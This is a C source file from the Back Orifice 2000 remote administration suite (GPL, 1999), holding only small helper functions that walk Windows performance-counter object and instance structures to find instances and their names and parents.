/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include <windows.h> 
#include <winperf.h> 
#include "perfdata.h" 
 

// FirstInstance() - Returns pointer to the first instance of pObject type. 
//                   If pObject is NULL then NULL is returned. 
 
PPERF_INSTANCE   FirstInstance (PPERF_OBJECT pObject) 
{ 
    if (pObject) 
        return (PPERF_INSTANCE)((PCHAR) pObject + pObject->DefinitionLength); 
    else 
        return NULL; 
} 
 
 
// NextInstance() - Returns pointer to the next instance following pInst. 
//                  If pInst is the last instance, bogus data maybe returned. 
//                  The caller should do the checking. 
//                  If pInst is NULL, then NULL is returned. 

PPERF_INSTANCE   NextInstance (PPERF_INSTANCE pInst) 
{ 
	PERF_COUNTER_BLOCK *pCounterBlock; 
	
    if (pInst) 
	{ 
        pCounterBlock = (PERF_COUNTER_BLOCK *)((PCHAR) pInst + pInst->ByteLength); 
        return (PPERF_INSTANCE)((PCHAR) pCounterBlock + pCounterBlock->ByteLength); 
	} 
    else 
        return NULL; 
} 
 
 
 
 
// FindInstanceN() - Returns the Nth instance of pObject type.  
//                   If not found, NULL is returned.  0 <= N <= NumInstances. 
 
PPERF_INSTANCE FindInstanceN (PPERF_OBJECT pObject, DWORD N) 
{ 
	PPERF_INSTANCE pInst; 
	DWORD          i = 0; 
	
    if (!pObject) 
        return NULL; 
    else if (N >= (DWORD)(pObject->NumInstances)) 
        return NULL; 
    else 
	{ 
        pInst = FirstInstance (pObject); 
		
        while (i != N) 
		{ 
            pInst = NextInstance (pInst); 
            i++; 
		} 
		
        return pInst; 
	} 
} 
 
 
 
 
// FindInstanceParent() - Returns the pointer to an instance that is the parent of pInst. 
//                        If pInst is NULL or the parent object is not found 
//                        then NULL is returned. 

PPERF_INSTANCE FindInstanceParent (PPERF_INSTANCE pInst, PPERF_DATA pData) 
{ 
	PPERF_OBJECT    pObject; 
	
    if (!pInst) 
        return NULL; 
    else if (!(pObject = FindObject (pData, pInst->ParentObjectTitleIndex))) 
        return NULL; 
    else 
        return FindInstanceN (pObject, pInst->ParentObjectInstance); 
} 


 
 
// InstanceName() - Returns the name of the pInst. 
//                  If pInst is NULL then NULL is returned. 

LPTSTR  InstanceName (PPERF_INSTANCE pInst) 
{ 
    if (pInst) 
        return (LPTSTR) ((PCHAR) pInst + pInst->NameOffset); 
    else 
        return NULL; 
} 

 

